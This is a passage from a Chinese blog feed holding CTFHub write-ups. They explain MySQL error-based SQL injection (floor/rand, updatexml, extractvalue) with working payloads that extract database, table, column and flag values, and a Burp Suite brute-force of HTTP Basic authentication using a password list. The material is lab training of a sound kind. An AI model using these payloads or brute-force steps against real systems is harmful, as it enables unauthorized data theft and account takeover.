by(分组)的</p></li><li><p>对于id和password里面的有多个数据的单元格，办法就是使用聚合函数，<strong>聚合函数用来输入多个数据，输出一个数据</strong>，比如count(id)，sum(password)</p></li><li><p>比如当我们执行select user,count(id) as c from test group by user，那么数据库根据group by后面的user字段进行分组，然后count(id)就会对虚拟表中的id字段的每个单元格进行count操作，比如user字段为jason的，虚拟表中属于jason那行的id有两个：1和7，所以返回的将会是2(<strong>计算属于jason的id的个数</strong>)，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121719520.png" alt="image-20211012171907436"></p></li></ol><hr><h2 id="group-by-amp-聚合函数"><a href="#group-by-amp-聚合函数" class="headerlink" title="group by&amp;聚合函数"></a>group by&amp;聚合函数</h2><p>接下来我们就可以把group by和聚合函数一起应用到上述SQL语句里面了</p><p>首先我们不用聚合函数，看一下group by对name会分成多少组，按理来说根据floor(rand()*2)随机取值的不同会分成两组(取值为0或1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121736474.png" alt="image-20211012173619402"></p><p>没错，确实分成了两组</p><p>那我们尝试把count()聚合函数加进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121742362.png" alt="image-20211012174229264"></p><p>说明执行之后计算得到字符串为”~~sql-error-inject~~1”的数量有157个，为”~~sql-error-inject~~0”的有169个</p><p>那我们再执行一遍</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121910574.png" alt="image-20211012191040411"></p><p>咳咳，虽然已经报错了，但是…这tm算什么报错！！我要的报错数据呢！(虽然确实提示了键值冲突)</p><p>然后这里换做rand(0)*2，一顿无脑疯狂执行(<strong>~~笑死~~</strong>)<strong>这里使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错(下面真的会讲)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121927712.png" alt="image-20211012192737602"></p><p>看看别人的报错…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121914664.png" alt="image-20211012191430557"></p><p>确实应该会有报错提示数据库的名字出来…目测是我的MYSQL版本太高了，我的MYSQL版本是8.0</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121916712.png" alt="image-20211012191658661"></p><p>百度了一下，确实是版本的问题，新版MYSQL8.x不适用这个floor让group by重复的这个报错注入了</p><p>参考链接<a href="https://blog.csdn.net/Cypher_X/article/details/119909526">group by主键重复适用版本</a></p><p>可恶啊…这算什么，那最后只能再解释一下报错原因了</p><h2 id="SQL报错原因"><a href="#SQL报错原因" class="headerlink" title="SQL报错原因"></a>SQL报错原因</h2><p>MYSQL官方给过提示，查询时如果用rand()，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果<strong>虚表不存在记录</strong>，插入虚表的时候会再被执行一次，我们先来看rand(0)*2的规律：<strong>011011</strong>。正是因为这个规律，所以刚才疯狂报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121937304.png" alt="image-20211012193742244"></p><p>来根据上面rand(0)*2的规律，来总结一下报错原因：</p><div class="note green icon simple"><i class="note-icon fas fa-bullhorn"></i><ol><li>查询的时候数据库会建立一个虚拟表</li><li>第一条记录执行floor(rand(0)*2)，<strong>第一次计算</strong>发现结果为0，查询虚拟表，0的键值不存在(说明虚表不存在0键值的记录)，则floor(rand(0)*2)会被再计算一次，结果为1(<strong>第二次计算</strong>)，插入虚表(此时插入的是1键值)</li><li>第二条记录执行floor(rand(0)*2)，<strong>第三次计算</strong>发现结果为1，查询虚拟表，1的键值存在，所以floor(rand(0)*2)不会被计算第二次，count(*)加1</li><li>第三条记录执行floor(rand(0)*2)，<strong>第四次计算</strong>发现结果为0，查询虚拟表，0的键值不存在，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，准备作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li><li>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以数据表中的行需要3条数据(注意，是数据表的行至少要有三行而不是五行，并不是要有第四第五行数据，rand(0)*2才会计算，以上的第四第五行只是为了显示第四个rand(0)*2和第五个rand(0)*2的随机值是多少)，使用该语句才会报错</li></ol></div><h2 id="floor-rand-2-报错"><a href="#floor-rand-2-报错" class="headerlink" title="floor(rand()*2)报错"></a>floor(rand()*2)报错</h2><p><strong>所以为什么使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错？</strong>由于没加入随机因子，所以floor(rand()*2)是不可测的，因此在有三条数据以上的时候，不含有随即因子的rand()*2只要出现下面情况，即可报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121952461.png" alt="image-20211012195232380"></p><p>前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()*2)不会再被计算做为虚表的键值，这也就是为什么不加随机因子有时候会报错，有时候不会报错的原因。</p><h1 id="CTFHub-SQL报错注入之floor"><a href="#CTFHub-SQL报错注入之floor" class="headerlink" title="CTFHub-SQL报错注入之floor()"></a>CTFHub-SQL报错注入之floor()</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SQL注入-&gt;报错注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>查看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020803.png" alt="image-20211012202031726"></p><p>按要求输入一个1试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020046.png" alt="image-20211012202051962"></p><p>返回查询正确，但是什么数据都没有回显到页面中，输入1’试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122021286.png" alt="image-20211012202152193"></p><p>好像又多了个单引号，说明可能是一个整型输入id，所以尝试直接用order by查看字段有多少个，输入：1 order by 2</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122024944.png" alt="image-20211012202407849"></p><p>虽然没有语法错误，显示查询正确，但还是没有数据回显，可能是SQL报错注入(题目上已经写了，但是我就是装瞎)</p><p>那就使用前面讲到的floor()函数来进行报错注入</p><div class="note warning simple"><p>需要注意的是这里的union联合查询中，要让前一个SQL语句成立，后一个SQL语句才能把内容报错到页面中，所以这里和下面的id=1</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select database()),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020101.png" alt="image-20211012202005984"></p><p>显示当前数据库为sqli，再爆表名(<mark class="hl-label red">不能用group_concat,而且要加limit</mark> )</p><blockquote><p>不加limit</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141717512.png" alt="image-20211014171737376"></p><p>会提示查询超过一行，所以我们还是加limit吧</p><blockquote><p>加limit</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122031167.png" alt="image-20211012203143964"></p><p>再爆字段(这里字段名和表名都是flag)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141700472.png" alt="image-20211014170042137"></p><p>然后爆字段的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select flag from sqli.flag),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122033900.png" alt="image-20211012203338755"></p><p>拿到flag啦！！耶！</p><h1 id="CTFHub-SQL报错注入之updatexml"><a href="#CTFHub-SQL报错注入之updatexml" class="headerlink" title="CTFHub-SQL报错注入之updatexml()"></a>CTFHub-SQL报错注入之updatexml()</h1><h2 id="updatexml-函数解析"><a href="#updatexml-函数解析" class="headerlink" title="updatexml()函数解析"></a>updatexml()函数解析</h2><p>updatexml()函数是用来更新xml文档的函数，其语法为：updatexml(xml文档对象名称，xml路径，更新内容)</p><p>UPDATEXML (XML_document, XPath_string, new_value); </p><p>然后主要是第二个参数。第二个参数的正确用法应该是xpath格式的字符串，即’/xxx/xxx/xxx’这种格式，但是如果我们输入的参数不符合该规范，就会把报错内容显示出来。</p><div class="note warning simple"><p>updatexml的最大长度是32位，所以报错内容有时候显示不完整，需要用mid()函数或者其它函数来显示剩余的部分</p></div><p>对此，我们可以构造的有关updatexml()报错注入的SQL语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><p>其中，database()的位置用来替换对应的查询语句。而updatexml的第一个参数和第三个参数可以随便填写，主要是利用第二个参数来进行报错注入。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191909949.png" alt="image-20211019190902811"></p><p>提示XPATH语法错误，并且提示了错误信息</p><p>爆表名</p><blockquote><p>这里可以用group_concat，只是floor()函数不可用而已</p><p>后面的sqli必须加引号当作字符串，否则会提示找不到该字段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191913321.png" alt="image-20211019191321241"></p><p>得到flag的表，然后爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191914872.png" alt="image-20211019191442804"></p><p>得到flag字段，所以可以直接爆sqli.flag的字段flag里的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191917890.png" alt="image-20211019191729806"></p><p>因为updatexml的最大长度是32位，这里的flag加上前面的~(0x7e)总共32位，所以显示的flag有31位，要想显示剩下的flag的内容，这里用mid()函数</p><blockquote><p><code>MID()</code>函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段。</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）。</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>因为已经显示31位flag字符，所以我们只需要从第32位字符开始提取就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select flag from sqli.flag),32),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191924790.png" alt="image-20211019192437694"></p><p>啊哈~可以看到第32位字符已经显示出来了，原来flag刚好有32位字符!!</p><div class="note red icon modern"><i class="note-icon fas fa-exclamation-circle"></i><p>这里会有人想：早知道concat的时候不在前面加0x7e了，这样刚好显示32位完整的flag</p><p>这个想法是错误的！！</p></div><p>这里演示一下concat()函数中的参数(select flag from sqli.flag)的前面不加0x7e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat((select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191933760.png" alt="image-20211019193322693"></p><p>并没有显示完整的flag，那是不是前后都不加0x7e，就会显示完整的flag了？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat((select flag from sqli.flag)),1)</span><br><span class="line">1 and updatexml(1,(select flag from sqli.flag),1)        //两条语句相同意思，报了相同的错误，但还是不会显示完整flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191941765.png" alt="image-20211019194145640"></p><p>好吧还是没有显示完整的flag，不过因为flag字符个数就是32位左右，所以其实可以不用mid()函数，直接像上述中不加0x7e就可以显示后面剩下的字符了，不过如果需要显示更长一点的内容，就不得不用到mid()函数了</p><h1 id="CTFHub-SQL报错注入之extractvalue"><a href="#CTFHub-SQL报错注入之extractvalue" class="headerlink" title="CTFHub-SQL报错注入之extractvalue()"></a>CTFHub-SQL报错注入之extractvalue()</h1><h2 id="extractvalue-函数解析"><a href="#extractvalue-函数解析" class="headerlink" title="extractvalue()函数解析"></a>extractvalue()函数解析</h2><p>extractvalue()函数是用来查询xml文档的函数，从目标XML中返回包含所查询值的字符串。其语法为：extractvalue(xml文档对象名称，xml路径)</p><p>EXTRACTVALUE (XML_document, XPath_string);</p><p>所以其实和updatexml()差不多，还是利用extractvalue()函数中的第二个参数来构造payload。下面的解题内容聪明的可以略过了~</p><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191956246.png" alt="image-20211019195655149"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191957088.png" alt="image-20211019195757011"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191958990.png" alt="image-20211019195846791"></p><p>爆内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select flag from sqli.flag),32),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191959300.png" alt="image-20211019195932220"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110192001150.png" alt="image-20211019200127061"></p>]]></content>
    
    
    <summary type="html">三种常用SQL-报错注入方法的原理以及使用(floor()、updatexml()、extractvalue())</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="SQL" scheme="https://jason177.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-HTTP基础认证</title>
    <link href="https://jason177.com/2021/09/29/ctfhub-http-basic/"/>
    <id>https://jason177.com/2021/09/29/ctfhub-http-basic/</id>
    <published>2021-09-29T05:28:22.000Z</published>
    <updated>2021-09-29T06:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-基础认证"><a href="#CTFHub-基础认证" class="headerlink" title="CTFHub-基础认证"></a>CTFHub-基础认证</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;Web前置技能-&gt;HTTP协议-&gt;基础认证</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>我靠…这么简单的题也好意思写博客…嘻嘻嘻，我就爱！</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291349515.png" alt="image-20210929114332527"></p><p>首先给了一个地址和一个题目附件，我们先去地址看一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144825.png" alt="image-20210929114434729"></p><p>有个click链接，点进去会有提示要求你输入用户名和密码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144968.png" alt="image-20210929114453896"></p><p>然后我们再打开题目给的附件，可以看到文件名<mark class="hl-label red">可能</mark> 意思就是：一千万个密码中最热门的100个密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291143423.png" alt="image-20210929114355318"></p><p>那好吧，密码字典已经给出来了，大概意思就是密码爆破咯。我们可以先尝试随便输入用户名和密码，然后利用<strong>Burp Suite</strong>进行抓包</p><div class="note info no-icon flat"><p>用户名：111</p><p>密码：123</p></div><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291145254.png" alt="image-20210929114540150"></p><p>可以看到中间有一个Authorization:Basic 阿巴阿巴</p><p>“Basic”就是”基础”的意思，对应题目的”基础认证”</p><p>咦？阿巴阿巴后面居然有两个等号</p><p>Base64解码一下咯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146786.png" alt="image-20210929114621674"></p><p>右键-&gt;转换选择-&gt;Base64-&gt;Base64解码</p><p>英文版的Burp Suite自己琢磨(我tm四级没过)</p><p>解出来如下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146081.png" alt="image-20210929114650979"></p><p>发现是自己输入的用户名和密码，中间冒号隔开，发送请求的时候Base64编码了</p><p>先不管，把请求包右键发送到重发器(REpeater)然后发送</p><h3 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291149872.png" alt="image-20210929114938674"></p><p>有提示！可以看到服务器的响应头里面有：”Do u know admin？”</p><p>所以用户名应该是admin</p><p>到这里可以用脚本对用户名和密码文件里的密码整合起来进行base64编码后爆破了</p><p>但是这里我比较菜，不会写脚本，所以用了个还算平民的方法(简单简单简单！)</p><h2 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h2><p>用Notepad++打开密码txt文件</p><p>Ctrl+H打开搜索替换</p><p>利用正则表达式，统一把”admin:”加在100个密码的前面</p><p>^表示行首，意思就是在每行行首凭空添加”admin:”，记得在下面把Search Mode中的Regular expression(正则表达式)选中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291158620.png" alt="image-20210929115801503"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291156520.png" alt="image-20210929115659396"></p><h2 id="Burp-Suite-Intruder"><a href="#Burp-Suite-Intruder" class="headerlink" title="Burp Suite(Intruder)"></a>Burp Suite(Intruder)</h2><p>替换好之后回到Burp Suite，右键把数据包发送到测试器(Intruder),然后点击Positions，选中已经被Base64编码的那一串字符，做一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291159870.png" alt="image-20210929115903743"></p><p>点击Positions右边的Payloads</p><p>添加我们的”用户名:密码”到有效载荷选项中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291204348.png" alt="image-20210929120446192"></p><p>然后发现了一个不重要的信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291205540.png" alt="image-20210929120512461"></p><p>为什么密码有101个！不是100个嘛！</p><p>经过我名侦探般的推理，后来发现是本来的密码文件的最后面多了个换行，导致添加”admin:”到密码文件的时候识别到最后一行的行首，所以在后面就多了一个”admin:”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291327824.png" alt="image-20210929132723779"></p><p>无关紧要，添加完密码文件后，在下面有效负载处理这边添加一个Base64编码规则</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291319193.png" alt="image-20210929131946082"></p><p>就是把密码文件中的字符先用Base64编码，然后再爆破</p><p>再往下拉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291320654.png" alt="image-20210929132036581"></p><p>防止base64编码后的=号被URL编码</p><p>然后就可以右上角开始攻击了！</p><p>结束后点击长度排序一下，可以看到长度不同的有效载荷，就是正确的用户名和密码啦！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291423106.png" alt="image-20210929142357974"></p><p>然后双击，就可以在下方的Response中看到flag</p><p>也可以直接复制这串base64放到数据包中的对应位置，然后放行数据包，就可以在网页上看到flag了！</p><p>也可以先解码一下，得到正确密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291323241.png" alt="image-20210929132353144"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291324570.png" alt="image-20210929132402515"></p><p>然后再重新返回页面输入正确的用户名和密码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291325922.png" alt="image-20210929132508810"></p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p>总结：</p><ol><li>填写用户名密码，然后用Burp Suite抓包，看到用户名和密码都被执行Base64编码后才传到服务器</li><li>抓的数据包发送到Repeater，看到响应头有提示用户名为admin</li><li>写脚本或者用Notepad++等其它软件在每行密码前添加”admin:”</li><li>抓的数据包发送到Intruder，然后对被Base64编码的地方添加一个payload</li><li>把密码文件载入到载荷中，进行base64编码后进行爆破攻击，得到正确的用户名和密码，拿到flag</li></ol></div><hr><blockquote><p>PS：好像正确的用户名密码不是固定的，记得自己手动做一下！</p><p>没想到第一条正经博客居然写那么啰嗦…</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树上的http基础认证题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="http" scheme="https://jason177.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇文章</title>
    <link href="https://jason177.com/2021/09/25/onepost/"/>
    <id>https://jason177.com/2021/09/25/onepost/</id>
    <published>2021-09-25T08:28:40.000Z</published>
    <updated>2021-09-25T09:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h1 id="我的第一篇文章！"><a href="#我的第一篇文章！" class="headerlink" title="我的第一篇文章！"></a>我的第一篇文章！</h1><p>其实我也不知道要讲什么，就先这样吧！</p><p>开启我的Blog生涯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109251640402.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="life" scheme="https://jason177.com/categories/life/"/>
    
    
    <category term="生活" scheme="https://jason177.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
